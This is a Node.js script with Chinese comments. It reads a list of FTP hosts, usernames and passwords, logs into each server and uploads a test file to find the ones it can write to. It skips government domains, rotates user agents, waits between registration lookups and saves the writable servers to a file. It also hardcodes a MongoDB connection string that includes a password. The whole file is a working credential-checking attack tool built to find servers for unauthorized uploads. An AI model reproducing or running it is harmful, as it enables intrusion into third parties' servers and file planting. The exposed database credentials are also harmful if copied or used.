const Client = require("ftp");
const _ = require("lodash");
const chalk = require("chalk");
const fs=require("fs")
const request = require('request-promise');
const sleep = require("ko-sleep");
const agent = require("secure-random-user-agent");
const MongoClient = require('mongodb').MongoClient;
const DB_CONN_STR = "mongodb://clyde:asdqwe123@list-shard-00-00-si9p2.mongodb.net:27017,list-shard-00-01-si9p2.mongodb.net:27017,list-shard-00-02-si9p2.mongodb.net:27017/ftp?ssl=true&replicaSet=list-shard-0&authSource=admin"

class DB{
  constructor(){
    this.db="11"
    this.oldList=[]
  }
  connect(){
    return new Promise((resolve,reject)=>{
      MongoClient.connect(DB_CONN_STR, { useNewUrlParser: true } ,(err, db)=> {
          if(err){
            console.log(chalk.red(err));
            reject(err)
          }else{
            console.log("连接成功！");
            this.db=db
            resolve(db)
          }
      })
    })
  }
  findList(){
    return new Promise((resolve,reject)=>{
      let ftp=this.db.db('ftp').collection("ftp")
      ftp.find({}).toArray((err, list)=>{
        if(err){
          reject(err)
        }else{
          this.oldList=list
          resolve(list)
        }
      });
    }) 
  }
  close(){
    this.db.close()
  }
}

const cp = option => {
  return new Promise((resolve, reject) => {
    let c = new Client();
    c.on("ready", () => {
      c.put('foo.txt', 'foo.txt', function(err) {
        c.end();
        if (err){
          resolve({...option,success: false})
        }else{
          resolve({...option,success: true});
        }
      });
    });
    c.on("error", e => {
      resolve({...option,success: false});
      c.end();
    });
    c.connect({...option,connTimeout:10000});
  });
};



const blastOne=async info=>{
  try{
    let ftp=info.split(",")
    if(ftp[0].includes("gov.cn")||ftp[0].includes("gov.com")){
      return {
        host:ftp[0],
        user:ftp[1],
        password:ftp[2],
        success:false
      }
    }else{
      let data=await cp({
        host:ftp[0],
        user:ftp[1],
        password:ftp[2]
      })
      return data
    }
  }catch(e){
    console.log(chalk.red(e));
  }
}
const checkRecord=async info=>{
  try {
    await sleep("60s");
    let url=`https://www.sojson.com/api/beian/${info.host}`
    let data=JSON.parse(await request({
      uri:url,
      headers: {
        'User-Agent': agent()
      },
    }))
    if(data.type!=200){ 
      info.success=false
      console.log(chalk.red(JSON.stringify(data)));
    }else{
      console.log(1111)
    }
    return info
  } catch (e) {
    console.log(chalk.red(e));
  }
}
const blast=async()=>{
  try {
    let res =fs.readFileSync(`${__dirname}/res.txt`,{encoding :"utf-8"});
    // 过滤空元素
    let arr=res.split("\r\n").filter(item=>{
      if(item) return item
    })
    console.log(`读取文件，获取到${arr.length}条数据`)
    console.log(`开始验证ftp`)
    let list=arr.map(item=>blastOne(item))
    let data=await Promise.all(list)
    //筛选出有权限上传的
    let finalRes=data.filter(item=>{
      if(item.success) return item
    })
    console.log(`一共有${finalRes.length}个ftp可以上传`)
    let text=finalRes.map(item=>`${item.host},${item.user},${item.password}`).join("\r\n")
    fs.writeFileSync(`${__dirname}/newres.txt`,text);
    console.log("导出文件")
    return finalRes
  } catch (e) {
    console.log(chalk.red(e));
  }
}

(async()=>{
  let db=new DB()
  await db.connect()
  await db.findList()
  console.log(db.oldList)
  await blast()
  db.close()
})()
